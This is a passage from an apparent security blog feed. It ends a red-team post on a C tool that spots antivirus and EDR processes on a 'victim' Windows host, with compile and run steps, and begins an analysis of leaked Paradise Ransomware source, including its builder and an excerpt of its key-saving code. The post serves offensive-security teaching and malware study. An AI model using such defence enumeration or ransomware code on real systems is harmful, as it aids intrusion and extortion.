&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;enumProcs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;PROCESSENTRY32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pe32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateToolhelp32Snapshot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TH32CS_SNAPPROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CreateToolhelp32Snapshot failed.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;pe32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PROCESSENTRY32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process32First&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pe32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Process32First failed.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_stricmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pe32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;szExeFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;found process: %s - %s &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process32Next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pe32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hProcessSnap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The only difference is if we found process from list, just print it.&lt;/p&gt;

&lt;p&gt;That’s all!&lt;/p&gt;

&lt;h3 id=&quot;demo&quot;&gt;demo&lt;/h3&gt;

&lt;p&gt;Let’s go to see everything in action.&lt;/p&gt;

&lt;p&gt;Compile it in attacker’s machine via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mingw&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;x86_64-w64-mingw32-g++ &lt;span class=&quot;nt&quot;&gt;-O2&lt;/span&gt; hack.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; hack.exe &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;/usr/share/mingw-w64/include/ &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ffunction-sections&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fdata-sections&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Wno-write-strings&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-exceptions&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fmerge-all-constants&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-static-libstdc&lt;/span&gt;++ &lt;span class=&quot;nt&quot;&gt;-static-libgcc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fpermissive&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-03_09-40.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, run it in the victim’s Windows host:&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;\hack.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Microsoft Windows Defender:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-01_03-55.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bitdefender:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-02_12-51.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kaspersky Total Security:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-02_13-21.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, everything is worked perfectly! =^..^=&lt;/p&gt;

&lt;p&gt;As result, we create simple open-source tool &lt;a href=&quot;https://github.com/MSSPLab/defc&quot;&gt;defc&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://websec.nl/scanner/result/DQEXTZPBJPRAALEFTWSGYQIGUAFCUP&quot;&gt;https://websec.nl/scanner/result/DQEXTZPBJPRAALEFTWSGYQIGUAFCUP&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7/2023-07-02_21-56.png&quot; alt=&quot;defc&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We hope that this simple tool can help red teamers and pentesters for their enumeration purposes on compromised hosts and serve as a starting point for more their own advanced tools.&lt;/p&gt;

&lt;p&gt;By Purple Team from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html&quot;&gt;Find process ID by name and inject to it. Simple C++ example.&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes&quot;&gt;Taking a Snapshot and Viewing Processes&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://github.com/MSSPLab/defc&quot;&gt;source code in github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="open-source" /><category term="redteam" /><category term="malware" /><category term="pentest" /><summary type="html">Hello, cybersecurity enthusiasts and white hackers!</summary></entry><entry><title type="html">Malware source code investigation: Paradise Ransomware</title><link href="http://localhost:4001/threat-hunting/2023/06/23/src-paradise.html" rel="alternate" type="text/html" title="Malware source code investigation: Paradise Ransomware" /><published>2023-06-23T05:00:00+03:00</published><updated>2023-06-23T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/06/23/src-paradise</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/06/23/src-paradise.html">&lt;p&gt;Paradise Ransomware is a type of malware that encrypts the files on the victims’ systems and then demands a ransom to recover the data. This ransomware family first appeared in 2017 and continues to be active with numerous variants identified over the years. The ransomware typically targets Windows operating systems, and it is distributed through multiple infection vectors, including malicious email attachments, compromised Remote Desktop Protocol (RDP), and exploit kits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/paradise-ransom.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On June 12, 2021, the source code for Paradise Ransomware was exposed on a Russian hacker forum on the dark web. After several iterations, the Ransomware became more robust by implementing RSA encryption, which made decryption impossible without the private key.&lt;/p&gt;

&lt;h3 id=&quot;project-evolution&quot;&gt;Project evolution&lt;/h3&gt;

&lt;p&gt;Paradise versions in 2017-2020:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Initial version of Paradise, which could be decrypted because of an encryption flaw&lt;/li&gt;
  &lt;li&gt;Paradise.NET: a secure.net version that encrypts files with RSA&lt;/li&gt;
  &lt;li&gt;ParadiseB29 is a variant employed by a “team” that encrypts only the file’s conclusion.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The leaked source code is written on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET&lt;/code&gt;, and when it is given the opportunity to operate in a local and virtualized environment, it runs smoothly and without issue on a basic version of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.NET framework&lt;/code&gt; in Microsoft Visual Studio.&lt;/p&gt;

&lt;p&gt;The leaked folder structure is simple:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-02.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ransom note of the new version is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-04.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;builder&quot;&gt;Builder&lt;/h3&gt;

&lt;p&gt;Over the source code it’s easy to find developer comments in Russian language =^..^=.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-13.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MALIKA&lt;/code&gt; is the username for the building computer. Microsoft Visual Studio permits the user who compiles source code into binary to provide certain information. The image below displays the username used to compile the project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-24.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Malika (ملك) - arabic female given name meaning “queen”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Configuration:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-27.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, it should be configured by inserting configuration statements directly into the source code.&lt;/p&gt;

&lt;p&gt;This ransomware have just one main form &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MainForm&lt;/code&gt;, as a result, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DP_Builder&lt;/code&gt;’s interface after compilation and execution looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_11-39.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To generate a random RSA encryption vector, click &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Generate&lt;/code&gt;. Extension of the name of the encrypted file (Russian &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Расширение&lt;/code&gt;). Address of the ransomware’s server, used for data collection. Administrator key that is extraneous to encryption and is used to identify the builder user.&lt;/p&gt;

&lt;p&gt;Site and Admin key values are stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server.info&lt;/code&gt;. When re-executed, the constructor will read these values from the file and automatically populate the fields.&lt;/p&gt;

&lt;p&gt;The source code for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DP_Builder&lt;/code&gt;’s main program, decrypter, and private key generator is contained in the resource file. At the time of package creation, random &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1024-bit&lt;/code&gt; RSA keys are generated and the ransomware’s private key is embedded. This guarantees a particular level of encryption security.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-38.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting trick: if there are no keys in the system (host), Paradise Ransomware generates and stores them on the local machine. Unfortunately, the method for storing private keys on disk encrypts them effectively, but there is still work to be done here. The mechanism used by this Ransomware version to handle keys is the most intriguing aspect for analysis. The following image depicts the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SavePrivateKey&lt;/code&gt; function, which does not do what you expect:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/6/2023-06-23_12-52.png&quot; alt=&quot;paradise&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SavePrivateKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;();&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;masterbytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RSA_Private&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iterations&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Ceiling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;masterbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;iterations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;++)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;++)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;masterbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;masterbytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;++;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strBytes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bts&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
